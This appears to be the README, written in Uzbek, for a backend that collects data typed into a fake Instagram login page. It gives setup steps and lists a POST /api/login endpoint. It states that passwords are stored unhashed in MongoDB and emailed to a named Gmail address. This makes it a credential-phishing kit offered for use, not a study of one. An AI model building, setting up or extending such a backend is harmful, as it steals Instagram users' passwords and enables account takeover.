# Instagram Login Backend

Bu backend Instagram login sahifasidan kiritilgan ma'lumotlarni qabul qiladi, MongoDB'ga saqlaydi va email orqali xabar yuboradi.

## O'rnatish

1. **Dependencies o'rnatish:**
```bash
npm install
```

2. **Environment variables sozlash:**
```bash
cp env.example .env
```

3. **.env faylini tahrirlash:**
- `EMAIL_USER`: Gmail emailingiz
- `EMAIL_PASS`: Gmail App Password (2FA yoqilgan bo'lishi kerak)
- `MONGODB_URI`: MongoDB connection string

4. **MongoDB o'rnatish va ishga tushirish**

5. **Server ishga tushirish:**
```bash
npm run dev
```

## API Endpoints

- `POST /api/login` - Login ma'lumotlarini qabul qiladi
- `GET /api/test` - Server ishlayotganini tekshirish

## Xususiyatlar

- Parollar hashlamasdan saqlanadi
- Ma'lumotlar MongoDB'ga saqlanadi
- Email xabari everestdevelopmet@gmail.com ga yuboriladi 